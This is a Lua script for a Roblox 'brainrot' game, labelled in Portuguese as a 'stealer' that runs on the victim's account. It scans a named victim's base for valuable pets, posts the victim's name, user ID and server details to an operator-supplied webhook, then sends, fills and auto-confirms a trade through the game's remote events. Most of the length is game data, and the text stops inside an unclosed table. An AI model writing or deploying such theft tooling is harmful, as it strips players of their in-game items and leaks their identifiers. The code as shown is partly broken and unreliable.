-- ============================================================
-- STEALER - RODA NA CONTA DA VÍTIMA (DADOS EMBUTIDOS)
-- ============================================================

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")
local HttpService = game:GetService("HttpService")
local LocalPlayer = Players.LocalPlayer

local ALLOWED_GAME_ID = 109983668079237
if game.PlaceId ~= ALLOWED_GAME_ID then
    warn("[Stealer] Jogo não permitido.")
    return
end

local TARGET_USER = getgenv().TARGET_USER or "SeuNick"
local WEBHOOK_URL = getgenv().WEBHOOK_URL or ""
local WANTED_BRAINROTS = getgenv().NORMAL_BRAINROTS or {}

-- ============================================================
-- NUMBER UTILS (EMBUTIDO)
-- ============================================================

local NumberUtils = {
    ToString = function(_, p2, p3)
        local suffixes = {"", "K", "M", "B", "T", "Qa", "Qi", "Sx", "Sp", "Oc", "No", "Dc", "Ud", "Dd", "Td", "Qad", "Qid", "Sxd", "Spd", "Ocd", "Nod", "Vg", "Uvg", "Dvg", "Tvg"}
        local v4 = p3 or 1
        local v5 = math.abs(p2)
        local v6 = math.max(1, v5)
        local v7 = math.log(v6, 1000)
        local v8 = math.floor(v7)
        local v9 = suffixes[v8 + 1] or "e+" .. v8
        local v10 = p2 * (10 ^ v4 / 1000 ^ v8)
        local v11 = math.floor(v10) / 10 ^ v4
        return ("%." .. v4 .. "f"):format(v11):gsub("%.?0+$", "") .. v9
    end,
    Comma = function(_, p12)
        local v13 = tostring(p12)
        local v14 = -1
        while v14 ~= 0 do
            v13, v14 = string.gsub(v13, "^(-?%d+)(%d%d%d)", "%1,%2")
        end
        return v13
    end
}

-- ============================================================
-- TRAITS DATA (EMBUTIDO - APENAS OS NOMES)
-- ============================================================

local TraitsData = {
    Ball = {MultiplierModifier = 5},
    Taco = {MultiplierModifier = 2.5},
    Burger = {MultiplierModifier = 4.5},
    ["Job Application"] = {MultiplierModifier = 4},
    Nyan = {MultiplierModifier = 5},
    Galactic = {MultiplierModifier = 3},
    Fireworks = {MultiplierModifier = 5},
    Zombie = {MultiplierModifier = 4},
    Claws = {MultiplierModifier = 4},
    Glitched = {MultiplierModifier = 4},
    Bubblegum = {MultiplierModifier = 3},
    Fire = {MultiplierModifier = 5},
    Wet = {MultiplierModifier = 1.5},
    Snowy = {MultiplierModifier = 2},
    Cometstruck = {MultiplierModifier = 2.5},
    Explosive = {MultiplierModifier = 3},
    Disco = {MultiplierModifier = 4},
    ["10B"] = {MultiplierModifier = 3},
    ["Shark Fin"] = {MultiplierModifier = 3},
    ["Matteo Hat"] = {MultiplierModifier = 3.5},
    Brazil = {MultiplierModifier = 5},
    Sleepy = {MultiplierModifier = 0},
    Lightning = {MultiplierModifier = 5},
    UFO = {MultiplierModifier = 2},
    Spider = {MultiplierModifier = 3.5},
    Strawberry = {MultiplierModifier = 9},
    Paint = {MultiplierModifier = 5},
    Skeleton = {MultiplierModifier = 3},
    Sombrero = {MultiplierModifier = 4},
    Tie = {MultiplierModifier = 3.75},
    ["Witch Hat"] = {MultiplierModifier = 3},
    Sun = {MultiplierModifier = 5},
    Indonesia = {MultiplierModifier = 4},
    Meowl = {MultiplierModifier = 8},
    ["RIP Gravestone"] = {MultiplierModifier = 3.5},
    ["Jackolantern Pet"] = {MultiplierModifier = 4.5},
    ["Santa Hat"] = {MultiplierModifier = 4},
    ["Reindeer Pet"] = {MultiplierModifier = 5},
    Skibidi = {MultiplierModifier = 6.5},
    ["26"] = {MultiplierModifier = 5},
    ["1 Year"] = {MultiplierModifier = 5.5},
    Rose = {MultiplierModifier = 5},
    [":3"] = {MultiplierModifier = 4.5},
    Chocolate = {MultiplierModifier = 4.5},
    Halo = {MultiplierModifier = 5},
    Lucky = {MultiplierModifier = 5},
    ["Orange Balloon"] = {MultiplierModifier = 3},
    ["Green Balloon"] = {MultiplierModifier = 3.5},
    ["Blue Balloon"] = {MultiplierModifier = 4},
    ["Red Balloon"] = {MultiplierModifier = 5},
    ["Pink Balloon"] = {MultiplierModifier = 5.5},
    ["Rainbow Balloon"] = {MultiplierModifier = 6.5},
    Granny = {MultiplierModifier = 5.5},
    ["Bunny Ears"] = {MultiplierModifier = 4.5},
    ["Orange Egg"] = {MultiplierModifier = 3},
    ["Green Egg"] = {MultiplierModifier = 4},
    ["Blue Egg"] = {MultiplierModifier = 5},
    ["Pink Egg"] = {MultiplierModifier = 6.5},
    ["John Pork"] = {MultiplierModifier = 7},
    ["Aura Shades"] = {MultiplierModifier = 4.5},
    Bull = {MultiplierModifier = 5},
}

-- ============================================================
-- MUTATIONS DATA (EMBUTIDO)
-- ============================================================

local MutationsData = {
    Gold = {Modifier = 0.25},
    Diamond = {Modifier = 0.5},
    Bloodrot = {Modifier = 1},
    Rainbow = {Modifier = 9},
    Candy = {Modifier = 3},
    Lava = {Modifier = 5},
    Galaxy = {Modifier = 6},
    YinYang = {Modifier = 6.5},
    Radioactive = {Modifier = 7.5},
    Cursed = {Modifier = 8},
    Divine = {Modifier = 9},
    Cyber = {Modifier = 10},
    Phantom = {Modifier = 11},
    Crystal = {Modifier = 12},
}

-- ============================================================
-- REMOTES
-- ============================================================

local function findRemote(id)
    for _, child in ipairs(ReplicatedStorage:GetDescendants()) do
        if child:IsA("RemoteEvent") or child:IsA("RemoteFunction") then
            if child.Name == id then
                return child
            end
        end
    end
    return nil
end

local REMOTES = {
    Invite = findRemote("afb005f9-6e81-4e0a-8bb0-3555938a9658"),
    AddBrainrot = findRemote("6b5f15fb-5cb9-4d07-a031-bbff8e641eda"),
    AddItem = findRemote("f2c4a9d1-3b7e-4a51-9c8d-1e6f0a2b3c4d"),
    Ready = findRemote("d73acf93-6f32-44df-b813-0f6b32c7afd9"),
    Accept = findRemote("918ee0f5-e98f-413f-b76e-baee47b021cb"),
}

-- ============================================================
-- FUNÇÕES
-- ============================================================

local function getUserIdByName(name)
    local success, result = pcall(function()
        return Players:GetUserIdFromNameAsync(name)
    end)
    if success and result then
        return result
    end
    return nil
end

local function getPlotOwner(plot)
    local sign = plot:FindFirstChild("PlotSign")
    if not sign then return nil end
    local gui = sign:FindFirstChildWhichIsA("SurfaceGui", true)
    if not gui then return nil end
    local label = gui:FindFirstChildWhichIsA("TextLabel", true)
    if not label then return nil end
    local text = label.Text
    if not text or text == "" or text:lower():find("empty") then return nil end
    local owner = text:match("^(.+)'s Base$")
    return owner or text
end

local function scanVictim(victimName)
    local plots = Workspace:FindFirstChild("Plots")
    if not plots then return {} end
    local victimPets = {}
    
    for _, plot in ipairs(plots:GetChildren()) do
        local owner = getPlotOwner(plot)
        if owner ~= victimName then continue end
        
        for _, desc in ipairs(plot:GetDescendants()) do
            if desc:IsA("Model") and desc:FindFirstChildOfClass("Humanoid") then
                local displayName = desc.Name
                local attrs = desc:GetAttributes()
                local mutation = attrs.Mutation or attrs.__mutation or "None"
                local traits = attrs.Traits and tostring(attrs.Traits) or "None"
                
                -- Calcula geração
                local gen = 0
                for idx, info in pairs(AnimalsData) do
                    if info.DisplayName == displayName then
                        gen = info.Generation or 0
                        break
                    end
                end
                
                -- Aplica mutação
                if mutation and mutation ~= "None" and mutation ~= "" then
                    local mInfo = MutationsData[mutation]
                    if mInfo and mInfo.Modifier then
                        gen = math.floor(gen * (1 + mInfo.Modifier))
                    end
                end
                
                table.insert(victimPets, {
                    name = displayName,
                    mutation = mutation,
                    traits = traits,
                    genValue = gen,
                })
            end
        end
    end
    return victimPets
end

local function sendWebhook(victimName, victimId, found, status)
    if WEBHOOK_URL == "" then return end
    local brainrotNames = {}
    for _, pet in ipairs(found) do
        local genText = NumberUtils.ToString(nil, pet.genValue, 1)
        table.insert(brainrotNames, pet.name .. " (Gen: $" .. genText .. "/s)")
    end
    
    local embed = {
        ["title"] = "VITIMA ENCONTRADA!",
        ["description"] = string.format(
            "**%s** [Brainrot]\n\n" ..
            "**Brainrots Encontrados:**\n%s\n\n" ..
            "**Server:** %s\n" ..
            "**Players:** %d\n" ..
            "**Scanned:** %s\n\n" ..
            "**Vítima:** %s • %d",
            status or "Status Desconhecido",
            #brainrotNames > 0 and table.concat(brainrotNames, "\n") or "Nenhum",
            game.JobId or "Desconhecido",
            #Players:GetPlayers(),
            os.date("%Y-%m-%d %H:%M:%S"),
            victimName,
            victimId
        ),
        ["color"] = 0xFF0000,
    }
    local payload = {["content"] = "@everyone", ["embeds"] = {embed}}
    pcall(function()
        HttpService:PostAsync(WEBHOOK_URL, HttpService:JSONEncode(payload), Enum.HttpContentType.ApplicationJson)
    end)
end

local function sendTradeRequest(targetUserId)
    if not REMOTES.Invite then return false, "Remote não encontrado" end
    local success, result = pcall(function()
        return REMOTES.Invite:InvokeServer(targetUserId)
    end)
    return success, result
end

local function addItemsToTrade(found)
    if not REMOTES.AddBrainrot then return end
    for _, pet in ipairs(found) do
        pcall(function()
            REMOTES.AddBrainrot:InvokeServer(pet.name, pet.mutation, pet.traits)
        end)
        task.wait(5)
    end
end

local function confirmTrade()
    if REMOTES.Ready then pcall(REMOTES.Ready.FireServer, REMOTES.Ready) end
    task.wait(1)
    if REMOTES.Accept then pcall(REMOTES.Accept.FireServer, REMOTES.Accept) end
end

-- ============================================================
-- ANIMALS DATA (EMBUTIDO)
-- ============================================================

local AnimalsData = {
    -- COMMON
    ["Noobini Pizzanini"] = {DisplayName = "Noobini Pizzanini", Generation = 1},
    ["Liril\195\172 Laril\195\160"] = {DisplayName = "Liril\195\172 Laril\195\160", Generation = 3},
    ["Tim Cheese"] = {DisplayName = "Tim Cheese", Generation = 5},
    ["Fluriflura"] = {DisplayName = "Fluriflura", Generation = 7},
    ["Svinina Bombardino"] = {DisplayName = "Svinina Bombardino", Generation = 10},
    ["Talpa Di Fero"] = {DisplayName = "Talpa Di Fero", Generation = 9},
    ["Pipi Kiwi"] = {DisplayName = "Pipi Kiwi", Generation = 13},
    ["Pipi Corni"] = {DisplayName = "Pipi Corni", Generation = 14},
    ["Raccooni Jandelini"] = {DisplayName = "Raccooni Jandelini", Generation = 12},
    ["Tartaragno"] = {DisplayName = "Tartaragno", Generation = 13},
    ["Noobini Santanini"] = {DisplayName = "Noobini Santanini", Generation = 11},
    ["Holy Arepa"] = {DisplayName = "Holy Arepa", Generation = 14},
    
    -- RARE
    ["Trippi Troppi"] = {DisplayName = "Trippi Troppi", Generation = 15},
    ["Gangster Footera"] = {DisplayName = "Gangster Footera", Generation = 30},
    ["Boneca Ambalabu"] = {DisplayName = "Boneca Ambalabu", Generation = 40},
    ["Ta Ta Ta Ta Sahur"] = {DisplayName = "Ta Ta Ta Ta Sahur", Generation = 55},
    ["Tric Trac Baraboom"] = {DisplayName = "Tric Trac Baraboom", Generation = 65},
    ["Bandito Bobritto"] = {DisplayName = "Bandito Bobritto", Generation = 35},
    ["Cacto Hipopotamo"] = {DisplayName = "Cacto Hipopotamo", Generation = 50},
    ["Pipi Avocado"] = {DisplayName = "Pipi Avocado", Generation = 70},
    ["Pinealotto Fruttarino"] = {DisplayName = "Pinealotto Fruttarino", Generation = 75},
    ["Cupcake Koala"] = {DisplayName = "Cupcake Koala", Generation = 60},
    ["Frogo Elfo"] = {DisplayName = "Frogo Elfo", Generation = 67},
    ["Pengolino Nuvoletto"] = {DisplayName = "Pengolino Nuvoletto", Generation = 72},
    
    -- EPIC
    ["Cappuccino Assassino"] = {DisplayName = "Cappuccino Assassino", Generation = 75},
    ["Brr Brr Patapim"] = {DisplayName = "Brr Brr Patapim", Generation = 100},
    ["Trulimero Trulicina"] = {DisplayName = "Trulimero Trulicina", Generation = 125},
    ["Bananita Dolphinita"] = {DisplayName = "Bananita Dolphinita", Generation = 150},
    ["Brri Brri Bicus Dicus Bombicus"] = {DisplayName = "Brri Brri Bicus Dicus Bombicus", Generation = 175},
    ["Bambini Crostini"] = {DisplayName = "Bambini Crostini", Generation = 135},
    ["Perochello Lemonchello"] = {DisplayName = "Perochello Lemonchello", Generation = 160},
    ["Avocadini Guffo"] = {DisplayName = "Avocadini Guffo", Generation = 225},
    ["Salamino Penguino"] = {DisplayName = "Salamino Penguino", Generation = 250},
    ["Ti Ti Ti Sahur"] = {DisplayName = "Ti Ti Ti Sahur", Generation = 225},
    ["Penguino Cocosino"] = {DisplayName = "Penguino Cocosino", Generation = 300},
    ["Avocadini Antilopini"] = {DisplayName = "Avocadini Antilopini", Generation = 115},
    ["Malame Amarele"] = {DisplayName = "Malame Amarele", Generation = 140},
    ["Mangolini Parrocini"] = {DisplayName = "Mangolini Parrocini", Generation = 235},
    ["Mummio Rappitto"] = {DisplayName = "Mummio Rappitto", Generation = 325},
    ["Frogato Pirato"] = {DisplayName = "Frogato Pirato", Generation = 240},
    ["Wombo Rollo"] = {DisplayName = "Wombo Rollo", Generation = 275},
    ["Doi Doi Do"] = {DisplayName = "Doi Doi Do", Generation = 260},
    ["Penguin Tree"] = {DisplayName = "Penguin Tree", Generation = 270},
    ["Gato Celesto"] = {DisplayName = "Gato Celesto", Generation = 250},
    
    -- LEGENDARY
    ["Burbaloni Loliloli"] = {DisplayName = "Burbaloni Loliloli", Generation = 200},
    ["Chimpanzini Bananini"] = {DisplayName = "Chimpanzini Bananini", Generation = 300},
    ["Ballerina Cappuccina"] = {DisplayName = "Ballerina Cappuccina", Generation = 500},
    ["Chef Crabracadabra"] = {DisplayName = "Chef Crabracadabra", Generation = 600},
    ["Glorbo Fruttodrillo"] = {DisplayName = "Glorbo Fruttodrillo", Generation = 750},
    ["Blueberrinni Octopusini"] = {DisplayName = "Blueberrinni Octopusini", Generation = 1000},
    ["Lionel Cactuseli"] = {DisplayName = "Lionel Cactuseli", Generation = 650},
    ["Pandaccini Bananini"] = {DisplayName = "Pandaccini Bananini", Generation = 1250},
    ["Strawberrelli Flamingelli"] = {DisplayName = "Strawberrelli Flamingelli", Generation = 1150},
    ["Cocosini Mama"] = {DisplayName = "Cocosini Mama", Generation = 1200},
    ["Pi Pi Watermelon"] = {DisplayName = "Pi Pi Watermelon", Generation = 1300},
    ["Sigma Boy"] = {DisplayName = "Sigma Boy", Generation = 1350},
    ["Pipi Potato"] = {DisplayName = "Pipi Potato", Generation = 1100},
    ["Quivioli Ameleonni"] = {DisplayName = "Quivioli Ameleonni", Generation = 900},
    ["Caramello Filtrello"] = {DisplayName = "Caramello Filtrello", Generation = 1050},
    ["Sigma Girl"] = {DisplayName = "Sigma Girl", Generation = 1800},
    ["Quackula"] = {DisplayName = "Quackula", Generation = 1275},
    ["Buho de Fuego"] = {DisplayName = "Buho de Fuego", Generation = 1850},
    ["Clickerino Crabo"] = {DisplayName = "Clickerino Crabo", Generation = 1000},
    ["Puffaball"] = {DisplayName = "Puffaball", Generation = 1500},
    ["Chocco Bunny"] = {DisplayName = "Chocco Bunny", Generation = 1400},
    ["Sealo Regalo"] = {DisplayName = "Sealo Regalo", Generation = 1825},
    ["Buho del Cielo"] = {DisplayName = "Buho del Cielo", Generation = 1350},
    ["Seraphino Gruyero"] = {DisplayName = "Seraphino Gruyero", Generation = 1900},
    ["Bandito Axolito"] = {DisplayName = "Bandito Axolito", Generation = 1225},
    ["Electro Quacko"] = {DisplayName = "Electro Quacko", Generation = 1850},
    
    -- MYTHIC
    ["Frigo Camelo"] = {DisplayName = "Frigo Camelo", Generation = 2000},
    ["Orangutini Ananassini"] = {DisplayName = "Orangutini Ananassini", Generation = 2100},
    ["Bombardiro Crocodilo"] = {DisplayName = "Bombardiro Crocodilo", Generation = 2500},
    ["Bombombini Gusini"] = {DisplayName = "Bombombini Gusini", Generation = 5000},
    ["Rhino Toasterino"] = {DisplayName = "Rhino Toasterino", Generation = 2150},
    ["Cavallo Virtuoso"] = {DisplayName = "Cavallo Virtuoso", Generation = 7500},
    ["Spioniro Golubiro"] = {DisplayName = "Spioniro Golubiro", Generation = 3500},
    ["Zibra Zubra Zibralini"] = {DisplayName = "Zibra Zubra Zibralini", Generation = 6000},
    ["Tigrilini Watermelini"] = {DisplayName = "Tigrilini Watermelini", Generation = 6500},
    ["Gorillo Watermelondrillo"] = {DisplayName = "Gorillo Watermelondrillo", Generation = 8000},
    ["Avocadorilla"] = {DisplayName = "Avocadorilla", Generation = 7000},
    ["Ganganzelli Trulala"] = {DisplayName = "Ganganzelli Trulala", Generation = 9000},
    ["Tob Tobi Tobi"] = {DisplayName = "Tob Tobi Tobi", Generation = 8500},
    ["Te Te Te Sahur"] = {DisplayName = "Te Te Te Sahur", Generation = 9500},
    ["Tracoducotulu Delapeladustuz"] = {DisplayName = "Tracoducotulu Delapeladustuz", Generation = 12000},
    ["Lerulerulerule"] = {DisplayName = "Lerulerulerule", Generation = 8750},
    ["Carloo"] = {DisplayName = "Carloo", Generation = 13500},
    ["Carrotini Brainini"] = {DisplayName = "Carrotini Brainini", Generation = 15000},
    ["Brutto Gialutto"] = {DisplayName = "Brutto Gialutto", Generation = 3000},
    ["Gorillo Subwoofero"] = {DisplayName = "Gorillo Subwoofero", Generation = 7750},
    ["Los Noobinis"] = {DisplayName = "Los Noobinis", Generation = 12500},
    ["Rhino Helicopterino"] = {DisplayName = "Rhino Helicopterino", Generation = 11000},
    ["Toiletto Focaccino"] = {DisplayName = "Toiletto Focaccino", Generation = 16000},
    ["Cachorrito Melonito"] = {DisplayName = "Cachorrito Melonito", Generation = 13000},
    ["Bananito Bandito"] = {DisplayName = "Bananito Bandito", Generation = 16500},
    ["Magi Ribbitini"] = {DisplayName = "Magi Ribbitini", Generation = 11500},
    ["Jacko Spaventosa"] = {DisplayName = "Jacko Spaventosa", Generation = 16250},
    ["Stoppo Luminino"] = {DisplayName = "Stoppo Luminino", Generation = 8000},
    ["Centrucci Nuclucci"] = {DisplayName = "Centrucci Nuclucci", Generation = 15500},
    ["Jingle Jingle Sahur"] = {DisplayName = "Jingle Jingle Sahur", Generation = 12250},
    ["Tree Tree Tree Sahur"] = {DisplayName = "Tree Tree Tree Sahur", Generation = 17000},
    ["Spongini Quackini"] = {DisplayName = "Spongini Quackini", Generation = 13000},
    ["Fizzy Soda"] = {DisplayName = "Fizzy Soda", Generation = 17250},
    ["Harpuccino"] = {DisplayName = "Harpuccino", Generation = 14000},
    ["Berenjello Angello"] = {DisplayName = "Berenjello Angello", Generation = 18000},
    ["Bee Loco"] = {DisplayName = "Bee Loco", Generation = 13500},
    ["Orbi Mochi"] = {DisplayName = "Orbi Mochi", Generation = 18500},
    ["Cocoteddy"] = {DisplayName = "Cocoteddy", Generation = 15000},
    ["Bucketoro"] = {DisplayName = "Bucketoro", Generation = 18250},
    
    -- BRAINROT GOD
    ["Chihuanini Taconini"] = {DisplayName = "Chihuanini Taconini", Generation = 45000},
    ["Cocofanto Elefanto"] = {DisplayName = "Cocofanto Elefanto", Generation = 19000},
    ["Tralalero Tralala"] = {DisplayName = "Tralalero Tralala", Generation = 50000},
    ["Odin Din Din Dun"] = {DisplayName = "Odin Din Din Dun", Generation = 75000},
    ["Girafa Celestre"] = {DisplayName = "Girafa Celestre", Generation = 20000},
    ["Trenostruzzo Turbo 3000"] = {DisplayName = "Trenostruzzo Turbo 3000", Generation = 150000},
    ["Matteo"] = {DisplayName = "Matteo", Generation = 50000},
    ["Tigroligre Frutonni"] = {DisplayName = "Tigroligre Frutonni", Generation = 60000},
    ["Orcalero Orcala"] = {DisplayName = "Orcalero Orcala", Generation = 100000},
    ["Unclito Samito"] = {DisplayName = "Unclito Samito", Generation = 75000},
    ["Gattatino Nyanino"] = {DisplayName = "Gattatino Nyanino", Generation = 35000},
    ["Espresso Signora"] = {DisplayName = "Espresso Signora", Generation = 70000},
    ["Ballerino Lololo"] = {DisplayName = "Ballerino Lololo", Generation = 200000},
    ["Piccione Macchina"] = {DisplayName = "Piccione Macchina", Generation = 225000},
    ["Los Crocodillitos"] = {DisplayName = "Los Crocodillitos", Generation = 55000},
    ["Tukanno Bananno"] = {DisplayName = "Tukanno Bananno", Generation = 100000},
    ["Trippi Troppi Troppa Trippa"] = {DisplayName = "Trippi Troppi Troppa Trippa", Generation = 175000},
    ["Los Tungtungtungcitos"] = {DisplayName = "Los Tungtungtungcitos", Generation = 210000},
    ["Bulbito Bandito Traktorito"] = {DisplayName = "Bulbito Bandito Traktorito", Generation = 205000},
    ["Los Orcalitos"] = {DisplayName = "Los Orcalitos", Generation = 235000},
    ["Tipi Topi Taco"] = {DisplayName = "Tipi Topi Taco", Generation = 75000},
    ["Bombardini Tortinii"] = {DisplayName = "Bombardini Tortinii", Generation = 225000},
    ["Tralalita Tralala"] = {DisplayName = "Tralalita Tralala", Generation = 100000},
    ["Urubini Flamenguini"] = {DisplayName = "Urubini Flamenguini", Generation = 150000},
    ["Alessio"] = {DisplayName = "Alessio", Generation = 85000},
    ["Pakrahmatmamat"] = {DisplayName = "Pakrahmatmamat", Generation = 215000},
    ["Los Bombinitos"] = {DisplayName = "Los Bombinitos", Generation = 220000},
    ["Brr es Teh Patipum"] = {DisplayName = "Brr es Teh Patipum", Generation = 225000},
    ["Tartaruga Cisterna"] = {DisplayName = "Tartaruga Cisterna", Generation = 250000},
    ["Cacasito Satalito"] = {DisplayName = "Cacasito Satalito", Generation = 240000},
    ["Mastodontico Telepiedone"] = {DisplayName = "Mastodontico Telepiedone", Generation = 275000},
    ["Crabbo Limonetta"] = {DisplayName = "Crabbo Limonetta", Generation = 235000},
    ["Gattito Tacoto"] = {DisplayName = "Gattito Tacoto", Generation = 165000},
    ["Los Tipi Tacos"] = {DisplayName = "Los Tipi Tacos", Generation = 260000},
    ["Las Capuchinas"] = {DisplayName = "Las Capuchinas", Generation = 185000},
    ["Orcalita Orcala"] = {DisplayName = "Orcalita Orcala", Generation = 240000},
    ["Piccionetta Macchina"] = {DisplayName = "Piccionetta Macchina", Generation = 270000},
    ["Anpali Babel"] = {DisplayName = "Anpali Babel", Generation = 280000},
    ["Extinct Ballerina"] = {DisplayName = "Extinct Ballerina", Generation = 125000},
    ["Tractoro Dinosauro"] = {DisplayName = "Tractoro Dinosauro", Generation = 230000},
    ["Belula Beluga"] = {DisplayName = "Belula Beluga", Generation = 290000},
    ["Capi Taco"] = {DisplayName = "Capi Taco", Generation = 155000},
    ["Corn Corn Corn Sahur"] = {DisplayName = "Corn Corn Corn Sahur", Generation = 250000},
    ["Brasilini Berimbini"] = {DisplayName = "Brasilini Berimbini", Generation = 285000},
    ["Squalanana"] = {DisplayName = "Squalanana", Generation = 250000},
    ["Pop Pop Sahur"] = {DisplayName = "Pop Pop Sahur", Generation = 295000},
    ["Vampira Cappucina"] = {DisplayName = "Vampira Cappucina", Generation = 125000},
    ["Jacko Jack Jack"] = {DisplayName = "Jacko Jack Jack", Generation = 150000},
    ["Snailenzo"] = {DisplayName = "Snailenzo", Generation = 250000},
    ["Tentacolo Tecnico"] = {DisplayName = "Tentacolo Tecnico", Generation = 292500},
    ["Pakrahmatmatina"] = {DisplayName = "Pakrahmatmatina", Generation = 225000},
    ["Bambu Bambu Sahur"] = {DisplayName = "Bambu Bambu Sahur", Generation = 275000},
    ["Krupuk Pagi Pagi"] = {DisplayName = "Krupuk Pagi Pagi", Generation = 290000},
    ["Mummy Ambalabu"] = {DisplayName = "Mummy Ambalabu", Generation = 250000},
    ["Cappuccino Clownino"] = {DisplayName = "Cappuccino Clownino", Generation = 285000},
    ["Skull Skull Skull"] = {DisplayName = "Skull Skull Skull", Generation = 290000},
    ["Aquanaut"] = {DisplayName = "Aquanaut", Generation = 245000},
    ["Frio Ninja"] = {DisplayName = "Frio Ninja", Generation = 265000},
    ["Money Money Man"] = {DisplayName = "Money Money Man", Generation = 65000},
    ["Noo La Polizia"] = {DisplayName = "Noo La Polizia", Generation = 280000},
    ["Los Chihuaninis"] = {DisplayName = "Los Chihuaninis", Generation = 160000},
    ["Los Gattitos"] = {DisplayName = "Los Gattitos", Generation = 275000},
    ["Granchiello Spiritell"] = {DisplayName = "Granchiello Spiritell", Generation = 260000},
    ["Ballerina Peppermintina"] = {DisplayName = "Ballerina Peppermintina", Generation = 215000},
    ["Ginger Globo"] = {DisplayName = "Ginger Globo", Generation = 257500},
    ["Ginger Cisterna"] = {DisplayName = "Ginger Cisterna", Generation = 293500},
    ["Yeti Claus"] = {DisplayName = "Yeti Claus", Generation = 257500},
    ["Buho de Noelo"] = {DisplayName = "Buho de Noelo", Generation = 267500},
    ["Chrismasmamat"] = {DisplayName = "Chrismasmamat", Generation = 277500},
    ["Cocoa Assassino"] = {DisplayName = "Cocoa Assassino", Generation = 291000},
    ["Pandanini Frostini"] = {DisplayName = "Pandanini Frostini", Generation = 294000},
    ["Tootini Shrimpini"] = {DisplayName = "Tootini Shrimpini", Generation = 260000},
    ["Boba Panda"] = {DisplayName = "Boba Panda", Generation = 270000},
    ["Dolphini Jetskini"] = {DisplayName = "Dolphini Jetskini", Generation = 294500},
    ["Luv Luv Luv"] = {DisplayName = "Luv Luv Luv", Generation = 282500},
    ["Karkerheart Luvkur"] = {DisplayName = "Karkerheart Luvkur", Generation = 297500},
    ["Divino Platypio"] = {DisplayName = "Divino Platypio", Generation = 160000},
    ["Astrolero Cervalero"] = {DisplayName = "Astrolero Cervalero", Generation = 280000},
    ["Dumborino Miracello"] = {DisplayName = "Dumborino Miracello", Generation = 315000},
    ["Patteo"] = {DisplayName = "Patteo", Generation = 287500},
    ["Clovkur Kurkur"] = {DisplayName = "Clovkur Kurkur", Generation = 305000},
    ["Bunny Tralala"] = {DisplayName = "Bunny Tralala", Generation = 270000},
    ["Eggdin Egg Egg Dun"] = {DisplayName = "Eggdin Egg Egg Dun", Generation = 310000},
    ["Pineaplino"] = {DisplayName = "Pineaplino", Generation = 200000},
    ["Lazy Ducky"] = {DisplayName = "Lazy Ducky", Generation = 255000},
    ["Cola Cat"] = {DisplayName = "Cola Cat", Generation = 275000},
    ["Tenini Ballini"] = {DisplayName = "Tenini Ballini", Generation = 320000},
    ["Appelini"] = {DisplayName = "Appelini", Generation = 300000},
    ["Trenotubo Axolotrico 9000"] = {DisplayName = "Trenotubo Axolotrico 9000", Generation = 255000},
    ["Pretzo Robo"] = {DisplayName = "Pretzo Robo", Generation = 320000},
    ["Lumaca Malefica"] = {DisplayName = "Lumaca Malefica", Generation = 265000},
    ["Robo Grafito"] = {DisplayName = "Robo Grafito", Generation = 317500},
    ["Sundrilla Sundae"] = {DisplayName = "Sundrilla Sundae", Generation = 180000},
    ["Lemonita Splashita"] = {DisplayName = "Lemonita Splashita", Generation = 280000},
    ["Flippo Marino"] = {DisplayName = "Flippo Marino", Generation = 316000},
    ["Tortuginni Sandcastlini"] = {DisplayName = "Tortuginni Sandcastlini", Generation = 317500},
    
    -- SECRET
    ["La Vacca Saturno Saturnita"] = {DisplayName = "La Vacca Saturno Saturnita", Generation = 325000},
    ["Los Tralaleritos"] = {DisplayName = "Los Tralaleritos", Generation = 500000},
    ["Graipuss Medussi"] = {DisplayName = "Graipuss Medussi", Generation = 1000000},
    ["La Grande Combinasion"] = {DisplayName = "La Grande Combinasion", Generation = 10000000},
    ["Sammyni Spyderini"] = {DisplayName = "Sammyni Spyderini", Generation = 325000},
    ["Garama and Madundung"] = {DisplayName = "Garama and Madundung", Generation = 50000000},
    ["Torrtuginni Dragonfrutini"] = {DisplayName = "Torrtuginni Dragonfrutini", Generation = 350000},
    ["Las Tralaleritas"] = {DisplayName = "Las Tralaleritas", Generation = 650000},
    ["Pot Hotspot"] = {DisplayName = "Pot Hotspot", Generation = 2500000},
    ["Nuclearo Dinossauro"] = {DisplayName = "Nuclearo Dinossauro", Generation = 15000000},
    ["Las Vaquitas Saturnitas"] = {DisplayName = "Las Vaquitas Saturnitas", Generation = 750000},
    ["Chicleteira Bicicleteira"] = {DisplayName = "Chicleteira Bicicleteira", Generation = 3500000},
    ["Agarrini la Palini"] = {DisplayName = "Agarrini la Palini", Generation = 425000},
    ["Los Combinasionas"] = {DisplayName = "Los Combinasionas", Generation = 15000000},
    ["Karkerkar Kurkur"] = {DisplayName = "Karkerkar Kurkur", Generation = 325000},
    ["Dragon Cannelloni"] = {DisplayName = "Dragon Cannelloni", Generation = 250000000},
    ["Los Hotspotsitos"] = {DisplayName = "Los Hotspotsitos", Generation = 20000000},
    ["Esok Sekolah"] = {DisplayName = "Esok Sekolah", Generation = 30000000},
    ["Nooo My Hotspot"] = {DisplayName = "Nooo My Hotspot", Generation = 1500000},
    ["Los Matteos"] = {DisplayName = "Los Matteos", Generation = 325000},
    ["Job Job Job Sahur"] = {DisplayName = "Job Job Job Sahur", Generation = 700000},
    ["Dul Dul Dul"] = {DisplayName = "Dul Dul Dul", Generation = 375000},
    ["Blackhole Goat"] = {DisplayName = "Blackhole Goat", Generation = 400000},
    ["Los Spyderinis"] = {DisplayName = "Los Spyderinis", Generation = 425000},
    ["Ketupat Kepat"] = {DisplayName = "Ketupat Kepat", Generation = 35000000},
    ["La Supreme Combinasion"] = {DisplayName = "La Supreme Combinasion", Generation = 200000000},
    ["Bisonte Giuppitere"] = {DisplayName = "Bisonte Giuppitere", Generation = 325000},
    ["Guerriro Digitale"] = {DisplayName = "Guerriro Digitale", Generation = 550000},
    ["Ketchuru and Musturu"] = {DisplayName = "Ketchuru and Musturu", Generation = 42500000},
    ["Spaghetti Tualetti"] = {DisplayName = "Spaghetti Tualetti", Generation = 60000000},
    ["Los Nooo My Hotspotsitos"] = {DisplayName = "Los Nooo My Hotspotsitos", Generation = 5500000},
    ["Trenostruzzo Turbo 4000"] = {DisplayName = "Trenostruzzo Turbo 4000", Generation = 335000},
    ["Fragola La La La"] = {DisplayName = "Fragola La La La", Generation = 32500000},
    ["La Sahur Combinasion"] = {DisplayName = "La Sahur Combinasion", Generation = 2000000},
    ["La Karkerkar Combinasion"] = {DisplayName = "La Karkerkar Combinasion", Generation = 600000},
    ["Tralaledon"] = {DisplayName = "Tralaledon", Generation = 27500000},
